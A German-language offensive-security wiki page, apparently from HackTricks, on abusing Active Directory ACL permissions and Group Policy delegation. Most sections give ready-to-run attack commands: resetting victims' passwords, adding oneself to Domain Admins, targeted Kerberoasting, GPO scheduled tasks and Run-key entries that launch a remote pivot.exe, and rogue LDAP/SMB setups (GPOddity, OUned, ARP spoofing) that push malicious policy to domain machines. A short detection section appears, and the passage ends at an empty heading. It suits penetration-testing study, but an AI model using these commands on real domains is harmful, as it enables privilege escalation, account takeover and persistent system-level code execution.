# Missbrauch von Active Directory-ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Diese Seite ist hauptsächlich eine Zusammenfassung der Techniken aus** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **und** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Weitere Details findest du in den Originalartikeln.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll-Rechte für Benutzer**

Dieses Privileg gewährt einem Angreifer die vollständige Kontrolle über ein Zielbenutzerkonto. Sobald die `GenericAll`-Rechte mit dem Befehl `Get-ObjectAcl` bestätigt wurden, kann ein Angreifer:

- **Das Passwort des Ziels ändern**: Mit `net user <username> <password> /domain` kann der Angreifer das Passwort des Benutzers zurücksetzen.
- Unter Linux kannst du dasselbe über SAMR mit Samba `net rpc` tun:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Wenn das Konto deaktiviert ist, das UAC-Flag löschen**: `GenericAll` ermöglicht die Bearbeitung von `userAccountControl`. Unter Linux kann BloodyAD das `ACCOUNTDISABLE`-Flag entfernen:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Weise dem Benutzerkonto einen SPN zu, damit es kerberoastable wird. Verwende anschließend Rubeus und targetedKerberoast.py, um die Ticket-Granting-Ticket-(TGT-)Hashes zu extrahieren und zu versuchen, sie zu knacken.

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Deaktiviere die Pre-Authentifizierung für den Benutzer, wodurch sein Konto anfällig für ASREPRoasting wird.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Mit `GenericAll` für einen Benutzer kannst du eine zertifikatbasierte Anmeldeinformation hinzufügen und dich als dieser Benutzer authentifizieren, ohne sein Passwort zu ändern. Siehe:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **GenericAll-Rechte für eine Gruppe**

Dieses Privileg ermöglicht es einem Angreifer, Gruppenmitgliedschaften zu manipulieren, wenn er `GenericAll`-Rechte für eine Gruppe wie `Domain Admins` hat. Nachdem der Distinguished Name der Gruppe mit `Get-NetGroup` ermittelt wurde, kann der Angreifer:

- **Sich selbst zur Gruppe „Domain Admins“ hinzufügen**: Dies ist über direkte Befehle oder mit Modulen wie Active Directory oder PowerSploit möglich.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Von Linux aus kannst du BloodyAD ebenfalls nutzen, um dich selbst beliebigen Gruppen hinzuzufügen, wenn du GenericAll/Write-Berechtigungen für deren Mitgliedschaft hast. Ist die Zielgruppe in „Remote Management Users“ verschachtelt, erhältst du sofort WinRM-Zugriff auf Hosts, die diese Gruppe berücksichtigen:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write auf Computer/Benutzer**

Diese Berechtigungen für ein Computerobjekt oder Benutzerkonto ermöglichen Folgendes:

- **Kerberos Resource-based Constrained Delegation**: Ermöglicht die Übernahme eines Computerobjekts.
- **Shadow Credentials**: Mit dieser Technik lässt sich ein Computer- oder Benutzerkonto imitieren, indem die Berechtigungen zum Erstellen von Shadow Credentials ausgenutzt werden.

## Ein Objekt in eine OU mit geerbten Berechtigungen verschieben

Ein Pfad kann **Verschiebeberechtigungen für ein Konto** mit **Schreibberechtigungen kombinieren, die von einer Ziel-OU geerbt werden** – selbst wenn zunächst keine der beteiligten Personen die sensiblen Attribute des Kontos ändern kann. Überprüfe die Verschiebeberechtigungen des Quellobjekts und `CreateChild` für das Ziel, verschiebe das Objekt und überprüfe anschließend erneut dessen effektive DACL. Zum Beispiel verschiebt `Set-DomainObjectDN -Identity <user> -DestinationDN 'OU=<destination>,DC=<domain>,DC=<tld>'` in powerview.py den Benutzer. Eine kontrollierte Gruppe mit geerbtem `GenericWrite` für diese OU kann dann ein [Shadow Credential](shadow-credentials.md) hinzufügen. Durch das Verschieben selbst wird die geerbte Berechtigung nicht erstellt.<sup>[[18]](#references)</sup>

Wenn du `GenericAll` für eine OU, aber keine geeignete geerbte ACE hast, kann `bloodyAD --host <dc> -d <domain> -k add genericAll 'OU=<destination>,DC=<domain>,DC=<tld>' <controlled-user>` eine ACE für deren untergeordnete Objekte hinzufügen. Überprüfe das Zielkonto separat: **Bei durch AdminSDHolder geschützten Konten ist die Vererbung deaktiviert**, daher kann eine OU-ACE normale Benutzer betreffen, bei einem geschützten Benutzer jedoch wirkungslos bleiben. Siehe [AdminSDHolder and SDProp](../privileged-groups-and-token-privileges.md#adminsdholder-group).<sup>[[18]](#references)</sup>

Ein separater Angriffsweg besteht, wenn ein privilegiertes Skript zur geplanten Bereinigung anhand von vom Angreifer beeinflussbaren ACEs OUs auswählt und dann für deren untergeordnete Objekte `Set-ADObject -Clear adminCount` **und** `$acl.SetAccessRuleProtection($False, $False)` ausführt. Wenn du die DACL der OU ändern kannst, weise der vom Skript überprüften Gruppe die erforderliche `ExtendedRight`- oder `GenericAll`-ACE zu. Überprüfe separat, ob du die Aufgabe auslösen kannst. Die privilegierte Aufgabe kann dann die Vererbung für ein zuvor geschütztes Konto wiederherstellen, sodass die OU-ACE wirksam wird. Überprüfe das genaue Skript, die Berechtigung zum Auslösen und die resultierende DACL. Das Löschen von `adminCount` allein aktiviert die Vererbung nicht wieder, und SDProp kann Konten, die weiterhin zu geschützten Gruppen gehören, erneut schützen.<sup>[[18]](#references)</sup>

## **WriteProperty für eine Gruppe**

Wenn ein Benutzer für alle Objekte einer bestimmten Gruppe (z. B. `Domain Admins`) `WriteProperty`-Berechtigungen hat, kann er:

- **Sich selbst zur Gruppe Domain Admins hinzufügen**: Dies lässt sich durch die Kombination der Befehle `net user` und `Add-NetGroupUser` erreichen und ermöglicht eine Rechteausweitung innerhalb der Domäne.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) für Gruppen**

Diese Berechtigung ermöglicht es Angreifern, sich selbst mithilfe von Befehlen, die die Gruppenmitgliedschaft direkt ändern, zu bestimmten Gruppen wie `Domain Admins` hinzuzufügen. Mit der folgenden Befehlsfolge können sie sich selbst hinzufügen:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Selbstmitgliedschaft)**

Ein ähnliches Recht ermöglicht es Angreifern, sich direkt zu Gruppen hinzuzufügen, indem sie Gruppeneigenschaften ändern, sofern sie für diese Gruppen das Recht `WriteProperty` besitzen. Die Überprüfung und Ausübung dieses Rechts erfolgt mit:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Das `ExtendedRight` für `User-Force-Change-Password` auf einem Benutzer ermöglicht das Zurücksetzen des Passworts, ohne das aktuelle Passwort zu kennen. Die Überprüfung dieses Rechts und dessen Ausnutzung sind über PowerShell oder alternative Befehlszeilentools möglich. Dabei gibt es mehrere Methoden, das Passwort eines Benutzers zurückzusetzen, darunter interaktive Sitzungen und Einzeiler für nicht interaktive Umgebungen. Die Befehle reichen von einfachen PowerShell-Aufrufen bis zur Verwendung von `rpcclient` unter Linux und zeigen die Vielseitigkeit der Angriffsvektoren.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner für eine Gruppe**

Wenn ein Angreifer feststellt, dass er `WriteOwner`-Rechte für eine Gruppe hat, kann er den Besitzer der Gruppe zu sich selbst ändern. Besonders schwerwiegend ist dies, wenn es sich bei der betreffenden Gruppe um `Domain Admins` handelt, da ein Besitzerwechsel eine umfassendere Kontrolle über Gruppenattribute und Mitgliedschaften ermöglicht. Dazu wird zunächst mit `Get-ObjectAcl` das richtige Objekt ermittelt und anschließend mit `Set-DomainObjectOwner` der Besitzer geändert, entweder per SID oder Name.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite auf User**

Diese Berechtigung ermöglicht es einem Angreifer, Benutzereigenschaften zu ändern. Mit `GenericWrite`-Zugriff kann der Angreifer insbesondere den Anmeldeskriptpfad eines Benutzers ändern, damit bei dessen Anmeldung ein schädliches Skript ausgeführt wird. Dazu wird der Befehl `Set-ADObject` verwendet, um die Eigenschaft `scriptpath` des Zielbenutzers so zu aktualisieren, dass sie auf das Skript des Angreifers verweist.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Ein enger gefasster `WriteProperty`-ACE, der auf das [`scriptPath`-Attribut](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e) des Benutzers beschränkt ist, kann ausreichen; `GenericWrite` ist nicht erforderlich. Kombinieren Sie dieses Attributrecht mit einem beschreibbaren Skript im `SYSVOL\<domain>\scripts`- oder `NETLOGON`-Verzeichnis des Bereichs und prüfen Sie anschließend, ob sich der Zielbenutzer wahrscheinlich anmeldet und das Skript erreicht. Das Skript wird bei der Anmeldung im Kontext dieses Benutzers ausgeführt. Prüfen Sie die effektiven AD- und Datei-/Freigabe-ACLs getrennt; ein passender Allow-ACE oder ein beschreibbares Verzeichnis allein weist nicht nach, dass der gesamte Pfad vorhanden ist.

## **GenericWrite on Group**

Mit diesem Privileg können Angreifer die Gruppenmitgliedschaft manipulieren, beispielsweise indem sie sich selbst oder andere Benutzer zu bestimmten Gruppen hinzufügen. Dazu wird ein Credential-Objekt erstellt, mit dem Benutzer einer Gruppe hinzugefügt oder daraus entfernt werden. Anschließend werden die Änderungen der Mitgliedschaft mit PowerShell-Befehlen überprüft.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Von Linux aus kann Samba `net` Mitglieder hinzufügen/entfernen, wenn du `GenericWrite` für die Gruppe besitzt (nützlich, wenn PowerShell/RSAT nicht verfügbar sind):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Der Besitz eines AD-Objekts und `WriteDACL`-Berechtigungen darauf ermöglichen es einem Angreifer, sich selbst `GenericAll`-Berechtigungen für das Objekt zu erteilen. Dies wird durch ADSI-Manipulation erreicht und ermöglicht die vollständige Kontrolle über das Objekt sowie die Änderung seiner Gruppenmitgliedschaften. Dennoch gibt es Einschränkungen beim Ausnutzen dieser Berechtigungen mit den Cmdlets `Set-Acl` / `Get-Acl` des Active Directory-Moduls.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Schnelle Übernahme mit WriteDACL/WriteOwner (PowerView)

Wenn du `WriteOwner` und `WriteDacl` für ein Benutzer- oder Dienstkonto hast, kannst du die vollständige Kontrolle übernehmen und sein Passwort mit PowerView zurücksetzen, ohne das alte Passwort zu kennen:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Notes:
- Möglicherweise musst du zunächst den Eigentümer zu dir selbst ändern, wenn du nur über `WriteOwner` verfügst:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Validieren Sie den Zugriff nach dem Zurücksetzen des Passworts mit einem beliebigen Protokoll (SMB/LDAP/RDP/WinRM).

## **Replikation in der Domäne (DCSync)**

Der DCSync-Angriff nutzt bestimmte Replikationsberechtigungen in der Domäne, um einen Domain Controller nachzuahmen und Daten, einschließlich Benutzeranmeldedaten, zu synchronisieren. Diese mächtige Technik erfordert Berechtigungen wie `DS-Replication-Get-Changes` und ermöglicht Angreifern, sensible Informationen aus der AD-Umgebung zu extrahieren, ohne direkten Zugriff auf einen Domain Controller zu haben.<sup>[[5]](#references)</sup> [**Erfahren Sie hier mehr über den DCSync-Angriff.**](../dcsync.md)

## GPO-Delegierung <a href="#gpo-delegation" id="gpo-delegation"></a>

### GPO-Delegierung

Delegierter Zugriff zur Verwaltung von Group Policy Objects (GPOs) kann erhebliche Sicherheitsrisiken bergen. Wenn beispielsweise einem Benutzer wie `offense\spotless` Rechte zur GPO-Verwaltung delegiert wurden, kann er über Berechtigungen wie **WriteProperty**, **WriteDacl** und **WriteOwner** verfügen. Diese Berechtigungen können für böswillige Zwecke missbraucht werden, wie mithilfe von PowerView ermittelt werden kann: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### GPO-Berechtigungen auflisten

Um falsch konfigurierte GPOs zu identifizieren, können die Cmdlets von PowerSploit miteinander verkettet werden. So lassen sich GPOs finden, die ein bestimmter Benutzer verwalten darf: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computer, auf die eine bestimmte Richtlinie angewendet wird**: Es ist möglich, zu ermitteln, für welche Computer eine bestimmte GPO gilt, um den potenziellen Wirkungsbereich besser einzuschätzen. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Auf einen bestimmten Computer angewendete Richtlinien**: Um zu sehen, welche Richtlinien auf einen bestimmten Computer angewendet werden, können Befehle wie `Get-DomainGPO` verwendet werden.

**OUs, auf die eine bestimmte Richtlinie angewendet wird**: Betroffene Organisationseinheiten (OUs) lassen sich mithilfe von `Get-DomainOU` ermitteln.

Sie können auch das Tool [**GPOHound**](https://github.com/cogiceo/GPOHound) verwenden, um GPOs aufzulisten und darin Probleme zu finden.

### GPO missbrauchen – New-GPOImmediateTask

Falsch konfigurierte GPOs können ausgenutzt werden, um Code auszuführen, beispielsweise durch das Erstellen einer sofortigen geplanten Aufgabe. Damit kann ein Benutzer auf betroffenen Computern zur lokalen Administratorengruppe hinzugefügt und seine Berechtigungen erheblich erhöht werden:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy-Modul – GPO-Missbrauch

Das GroupPolicy-Modul ermöglicht, sofern es installiert ist, das Erstellen und Verknüpfen neuer GPOs sowie das Festlegen von Einstellungen wie Registrierungswerten, um Backdoors auf betroffenen Computern auszuführen. Bei dieser Methode muss die GPO aktualisiert werden und sich ein Benutzer am Computer anmelden, damit die Ausführung erfolgt:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse – GPO-Missbrauch

SharpGPOAbuse bietet eine Methode, vorhandene GPOs zu missbrauchen, indem Aufgaben hinzugefügt oder Einstellungen geändert werden, ohne neue GPOs erstellen zu müssen. Dieses Tool erfordert, dass vorhandene GPOs geändert oder mithilfe von RSAT-Tools neue erstellt werden, bevor Änderungen angewendet werden:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Richtlinienaktualisierung erzwingen

GPO-Aktualisierungen erfolgen normalerweise etwa alle 90 Minuten. Um diesen Vorgang zu beschleunigen, insbesondere nach einer Änderung, kann auf dem Zielcomputer der Befehl `gpupdate /force` verwendet werden, um sofort eine Richtlinienaktualisierung zu erzwingen. Dadurch werden alle Änderungen an GPOs angewendet, ohne auf den nächsten automatischen Aktualisierungszyklus warten zu müssen.

### Ein Blick unter die Haube

Bei der Untersuchung der geplanten Aufgaben einer bestimmten GPO, etwa der `Misconfigured Policy`, lässt sich das Hinzufügen von Aufgaben wie `evilTask` bestätigen. Diese Aufgaben werden mithilfe von Skripten oder Befehlszeilentools erstellt, die das Systemverhalten ändern oder Berechtigungen erweitern sollen.

Die Struktur der Aufgabe, wie sie in der von `New-GPOImmediateTask` generierten XML-Konfigurationsdatei dargestellt wird, enthält die Details der geplanten Aufgabe – darunter den auszuführenden Befehl und die zugehörigen Trigger. Diese Datei zeigt, wie geplante Aufgaben innerhalb von GPOs definiert und verwaltet werden, und ermöglicht die Ausführung beliebiger Befehle oder Skripte als Teil der Richtlinienanwendung.

### Benutzer und Gruppen

GPOs ermöglichen auch die Manipulation von Benutzer- und Gruppenmitgliedschaften auf Zielsystemen. Durch direktes Bearbeiten der Richtliniendateien für Benutzer und Gruppen können Angreifer Benutzer zu privilegierten Gruppen hinzufügen, etwa zur lokalen Gruppe `administrators`. Dies ist durch die Delegierung von GPO-Verwaltungsberechtigungen möglich, die das Ändern von Richtliniendateien erlaubt, um neue Benutzer aufzunehmen oder Gruppenmitgliedschaften zu ändern.

Die XML-Konfigurationsdatei für Benutzer und Gruppen beschreibt, wie diese Änderungen umgesetzt werden. Durch das Hinzufügen von Einträgen zu dieser Datei können bestimmten Benutzern auf den betroffenen Systemen erhöhte Berechtigungen gewährt werden. Diese Methode bietet einen direkten Weg zur Rechteausweitung durch die Manipulation von GPOs.

Untersuchen Sie bei Sicherheitseinstellungen wie der Mitgliedschaft in lokalen Gruppen und Benutzerrechten auch die angewendete GPO-Vorlage unter `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` sowie die ACL des Verzeichnisses `SecEdit`. Ein beschreibbares Verzeichnis oder eine beschreibbare Datei ist ein Ansatzpunkt für weitere Prüfungen: Ob eine Änderung wirksam wird, hängt weiterhin von den effektiven Zugriffsrechten auf die SYSVOL-Freigabe, verweigernden und geerbten ACLs, den Berechtigungen des Group Policy-Containers, dem Richtlinienbereich und der Clientaktualisierung ab. Die Mitgliedschaft in einer Gruppe namens „GPO Managers“ allein belegt keine Bearbeitungsberechtigungen. [Microsoft dokumentiert diesen Vorlagenpfad sowie die Trennung zwischen Group Policy-Container und -Vorlage.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Darüber hinaus kommen weitere Methoden zur Codeausführung oder zur Aufrechterhaltung von Persistenz infrage, etwa die Nutzung von Anmelde-/Abmeldeskripten, Änderungen an Registry-Schlüsseln für Autoruns, die Installation von Software über .msi-Dateien oder die Bearbeitung von Dienstkonfigurationen. Diese Techniken bieten verschiedene Möglichkeiten, durch den Missbrauch von GPOs Zugriff aufrechtzuerhalten und Zielsysteme zu kontrollieren.

### GPC/GPT-Abruf an authentifizierte Rogue-Dienste umleiten

Eine GPO besteht aus einem LDAP-**Group Policy Container (GPC)** mit Metadaten und einem über SMB bereitgestellten **Group Policy Template (GPT)** mit den Richtliniendateien. Bei einer Aktualisierung folgt der Client dem `gPLink`, liest den referenzierten GPC und dessen `gPCFileSysPath` und lädt anschließend das GPT von diesem UNC-Pfad herunter. Daher kann Schreibzugriff auf den GPC selbst oder auf den `gPLink` einer OU, Site oder Domain in eine privilegierte Richtlinienverarbeitung umgewandelt werden.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### `gPCFileSysPath` mit GPOddity manipulieren

Kann der kontrollierte Principal den Ziel-GPC beschreiben (direkt oder per **NTLM relay to LDAP**), lässt sich `gPCFileSysPath` durch einen vom Angreifer gehosteten UNC-Pfad ersetzen. [GPOddity](https://github.com/synacktiv/GPOddity) automatisiert die LDAP-Änderung und stellt ein bösartiges GPT bereit, das richtlinienbasierte Moduldateien oder eine Immediate Task enthält, die der Group Policy-Client als `NT AUTHORITY\SYSTEM` ausführt.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Eine anonyme oder nicht an Zugangsdaten gebundene SMB-Freigabe reicht bei aktuellen Windows-Clients nicht aus: SMB Secure Negotiate verlangt einen Nachweis, dass die Authentifizierung erfolgreich war. Daher muss der Rogue-Dienst die Domänenidentität validieren, den SMB-Sitzungsschlüssel ableiten und seine Antworten korrekt signieren. Konfigurieren Sie GPOddity im Embedded-Modus mit einem kontrollierten Computerkonto und dessen Dienstschlüssel. Wählen Sie anschließend im Abschnitt `[COMMANDS]` eine Computer- oder Benutzer-Payload aus.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Benutzer-GPO-Sonderfall:** Nach MS16-072 erstellt Windows weiterhin zwei SMB2-Sitzungen über dieselbe TCP-Verbindung: Die Benutzersitzung liest `GPT.INI`, anschließend liest die Sitzung des Computerkontos die effektive Konfiguration, z. B. `ScheduledTasks.xml`. Ein Rogue Server muss daher Authentifizierungsstatus, Sitzungsschlüssel und Signaturschlüssel nach SMB2-`SessionId` indizieren und nicht nur nach Socket. Der in GPOddity/OUned eingebettete Scapy-Fork implementiert dies mithilfe von `SMBStreamSocketMultiplexing` und einem Multiplexing-fähigen `SMBServer`; Single-Session-Server von Impacket/Scapy verwenden andernfalls den falschen Signaturstatus wieder und scheitern bei Benutzerrichtlinien.<sup>[[15]](#references)</sup>

#### `gPLink`-Poisoning mit OUned

Mit `WriteGPLink`, `GenericWrite` oder gleichwertiger Kontrolle über eine OU, Site oder Domain kann ein Angreifer einen Link hinzufügen, dessen GPC-DN von einem LDAP-Host unter seiner Kontrolle bereitgestellt wird. Diese Technik wurde ursprünglich von Petros Koutroumpis vorgestellt; [OUned](https://github.com/synacktiv/OUned) automatisiert den LDAP-Schreibvorgang und die bösartige GPC/GPT-Kette.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

Das Opfer authentifiziert sich zuerst beim rogue LDAP service und erhält eine GPC, deren `gPCFileSysPath` auf den rogue SMB service verweist; anschließend authentifiziert es sich bei SMB und wendet die bereitgestellte GPT an. OUned benötigt daher ein Konto mit einem LDAP SPN, ein Maschinenkonto mit einem HOST SPN für SMB (dasselbe Maschinenkonto kann beides erfüllen) sowie DNS-Auflösung oder Reverse Forwarding, das die Ports 389 und 445 an den Operator-Host weiterleitet.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

OUned's eingebetteter Scapy-LDAP-Server validiert Kerberos/SPNEGO mit dem echten kontrollierten Service-Key und stellt beliebige GPC-Daten aus JSON bereit. Der leere JSON-Schlüssel bildet rootDSE ab, `base64:`-Präfixe kennzeichnen Binärwerte und der Server unterstützt Add-, Delete-, Modify- und Search-Operationen sowie `BASE`-, `LEVEL`- und `SUBTREE`-Suchen; er kann keine Schutzfunktion, Integritätsschutz oder Vertraulichkeit aushandeln. Dadurch lässt sich der Dienst wiederverwenden, wenn eine andere Windows-Komponente einem vom Angreifer kontrollierten LDAP-Verweis folgt, aber authentifiziertes LDAP voraussetzt.<sup>[[15]](#references)</sup>

Gehe nicht davon aus, dass das Synchronisieren eines Account-Passworts in eine Dummy-Domain alle Kerberos-Keys reproduziert: RC4 wird aus dem Passwort abgeleitet, während AES String-to-Key zusätzlich einen Salt verwendet, der vom Hostnamen/der Domain des Principals abgeleitet wird. Wenn du den tatsächlichen AES-Key des Accounts an `KerberosSSP` übergibst, musst du RC4 nicht durch eine erkennbare Änderung am selbst beschreibbaren `msDS-SupportedEncryptionTypes` des Machine Accounts erzwingen.<sup>[[15]](#references)</sup>

#### Detection-Pivots

Korreliere Änderungen an `gPCFileSysPath` oder `gPLink` mit Änderungen an GPO-Versionen und neuen Immediate-/Scheduled-Task-XML-Dateien. Untersuche Verknüpfungen zu unerwarteten Naming Contexts, UNC-Hosts außerhalb der freigegebenen DC-/SYSVOL-Gruppe, DNS-Einträge, die Machine-Account-Namen umleiten, LDAP-/CIFS-Service-Tickets für ungewöhnliche Machine Accounts sowie Änderungen an `msDS-SupportedEncryptionTypes`, durch die RC4 aktiviert wird.<sup>[[15]](#references)</sup>

### WriteGPLink + UNC path hijacking (ARP spoofing)

Mit `WriteGPLink` auf einer OU/Domain kannst du das `gPLink`-Attribut des Zielcontainers ändern und **erzwingen, dass eine vorhandene GPO angewendet wird**, ohne die GPO selbst zu bearbeiten. Das ist interessant, wenn die verknüpfte GPO bereits auf entfernte Inhalte über **UNC-Pfade** (`\\HOST\share\...`) verweist, da authentifizierte Benutzer **SYSVOL** lesen und offline nach wiederverwendbaren Policies suchen können.<sup>[[11]](#references)</sup>

Workflow auf hoher Ebene:

1. Verwende BloodHound, um einen Principal mit `WriteGPLink` auf einer OU zu finden, und ermittle Computer/Benutzer innerhalb dieser OU.
2. Klone `SYSVOL` schreibgeschützt und analysiere GPOs auf **Software Installation**, **Laufwerkszuordnungen** (`Drives.xml`) sowie Anmelde-/Startskripte, die auf UNC-Pfade verweisen.
3. Bevorzuge Policies, die auf einen **direkten Hostnamen** zeigen (zum Beispiel `\\DC02\share\pkg.msi`), statt auf DFS-/Domain-Namespace-Pfade, da sich hostnamenbasierte Pfade leichter mit L2-Spoofing umleiten lassen.
4. Hänge die GUID der ausgewählten GPO an `gPLink` der Ziel-OU an, damit der Victim diese bereits vorhandene Policy verarbeitet.
5. Führe im selben Broadcast-Domain ARP-Spoofing für den UNC-Host durch und binde dessen IP lokal (`ip addr add <target_ip>/32 dev <iface>`), damit der SMB-Traffic des Victims deinen Host erreicht.
6. Stelle den erwarteten Pfad/Dateinamen über einen Angreifer-SMB-Server bereit (zum Beispiel `smbserver.py`) und warte auf die normale Policy-Verarbeitung.

Beispiel für die Erfassung von `SYSVOL` und die Korrelation von GPOs:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Verknüpfe das vorhandene GPO mit der Ziel-OU:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

